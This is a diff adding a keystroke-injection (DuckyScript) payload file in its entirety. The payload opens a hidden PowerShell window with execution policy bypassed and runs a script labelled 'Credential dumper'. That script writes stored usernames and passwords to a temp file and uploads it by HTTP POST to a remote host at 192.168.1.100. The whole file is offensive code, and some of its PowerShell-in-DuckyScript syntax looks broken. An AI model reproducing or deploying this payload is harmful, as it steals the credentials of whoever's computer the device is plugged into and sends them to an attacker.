@@ -1,0 +1,16 @@
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+REM Credential dumper
+$string = @"
+`$credPath = "$env:TEMP\creds.txt"
+`$creds = Get-StoredCredential -ErrorAction SilentlyContinue
+`$creds | ForEach-Object { "`$($_.UserName):$($_.Password)" } | Out-File `$credPath
+Invoke-WebRequest -Uri "http://192.168.1.100/upload" -Method POST -InFile `$credPath
+"@
+ENTER
+DELAY 500
+STRING $string | Invoke-Expression
